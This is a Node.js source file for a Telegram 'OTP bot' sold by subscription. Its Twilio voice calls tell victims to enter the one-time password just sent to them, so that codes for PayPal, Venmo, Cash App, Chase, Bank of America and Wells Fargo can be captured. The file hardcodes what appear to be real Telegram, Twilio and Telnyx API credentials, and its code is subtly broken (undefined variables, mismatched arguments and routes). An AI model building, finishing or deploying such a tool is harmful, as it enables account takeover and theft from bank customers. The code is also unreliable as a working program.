const { Telegraf } = require('telegraf'); // importing telegraf.js
const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
var bot = new Telegraf(bot_token)
const accountSid = 'ACc1e28d24ec07899a6bb94af38ab9a31c';
const authToken = 'b90ab5caf73ed1da0355d8d0dd7e319c';
const twilio_cell_number = '+14179322556'
const client = require('twilio')(accountSid, authToken);

// TELNYX STUFF 
const MY_API_KEY = 'ASGHJ2J623RV34I3C63VTEY8C'
const telnyx = require('telnyx')('YOUR_API_KEY');

const express = require('express');
const { Hangup } = require('twilio/lib/twiml/VoiceResponse');
const { ServiceInstance } = require('twilio/lib/rest/chat/v1/service');
const app = express();
const port = process.env.PORT || 3000;

function call (customer_number, ctx){
   console.log(ctx)
   bot.telegram.sendMessage(ctx.chat.id, `call ongoing...\n Calling ${customer_number} \n please wait...`, {})

   client.calls
         .create({
            twiml: '<Response><Gather input="dtmf" timeout="20" action = "/collect_otp"><Say>Please type in the One time Password which we sent to you</Say></Gather></Response>',
            to: `${number}`,
            from: twilio_cell_number
         })
         .then((call) => {
            console.log(call.sid)
            bot.telegram.sendMessage(ctx.chat.id, `call ended, otp is loading...`, {})
         });

}


//  COMMANDS
bot.on('start', ctx => {
   console.log(ctx.from)
   bot.telegram.sendMessage(
      ctx.chat.id, `
      𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
      ➤ Type: /purchase to subscribe \n 
      👤 USER COMMANDS 👤 \n
      ➤ /redeem - Redeem your key\n
      ➤ /checktime - Check subscription time left\n\n
      📞 CALL COMMANDS 📞 \n 
      ➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
      ➤ /bank - Capture bank OTP\n
      ➤ /boa - Capture boa OTP\n
      ➤ /chase - Capture chase OTP\n
      ➤ /wellsfargo - Capture Wells fargo OTP\n
      ➤ /venmo - Capture venmo OTP\n
      ➤ /paypal - Capture bank OTP\n      
      `, {})
})

bot.help(ctx => ctx.reply(`
   𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
➤ Type: /purchase to subscribe \n 
👤 USER COMMANDS 👤 \n
➤ /redeem - Redeem your key\n
➤ /checktime - Check subscription time left\n\n
📞 CALL COMMANDS 📞 \n 
➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
➤ /bank - Capture bank OTP\n
➤ /boa - Capture boa OTP\n
➤ /chase - Capture chase OTP\n
➤ /wellsfargo - Capture Wells fargo OTP\n
➤ /venmo - Capture venmo OTP\n
➤ /paypal - Capture bank OTP\n
`))

bot.command('call', ctx => {
   console.log(ctx)
   const number = ctx.message.text.split(' ');
   const service = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]

   if(!number[1] || !service.includes(number[3])){
      bot.telegram.sendMessage(ctx.chat.id, `❌( Error )❌ : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, `Call has Started...`, {
         reply_markup:{
            inline_keyboard: [
               [
                  {
                     text: 'End Call',
                     callback_data: 'end'
                  }               
               ]
            ]
         }
      }).then(() =>{
         call(number[2], number[3], ctx)
      })      
   }


})

bot.launch();

app.post('/process_gather', (req, res) => {
   const digits = req.body.Digits;
   console.log(digits);
   res.send(`
   <Response>
      <Say>You entered ${digits}</Say>
   </Response>
   `);
 });
 
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
 });
 

